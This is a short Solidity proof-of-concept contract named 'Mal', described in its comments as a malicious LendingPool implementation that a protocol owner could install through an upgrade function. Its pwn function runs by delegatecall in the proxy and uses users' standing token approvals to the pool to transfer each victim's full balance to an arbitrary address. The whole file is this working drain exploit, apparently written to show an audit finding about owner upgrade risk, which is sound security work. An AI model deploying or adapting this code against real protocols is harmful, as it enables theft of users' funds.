// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
interface IERC20 { function transferFrom(address,address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }
// Malicious LendingPool implementation an owner could install via setLendingPoolImpl
contract Mal {
    function initialize(address) external {}                    // no-op, satisfies upgradeToAndCall
    // runs by delegatecall in the proxy => msg.sender to token == the pool (holder of user allowances)
    function pwn(address token, address victim, address to) external returns (uint256 taken) {
        taken = IERC20(token).balanceOf(victim);               // FULL balance, not min(bal,allowance-cap)
        IERC20(token).transferFrom(victim, to, taken);         // uses victim's standing approval to the pool
    }
}
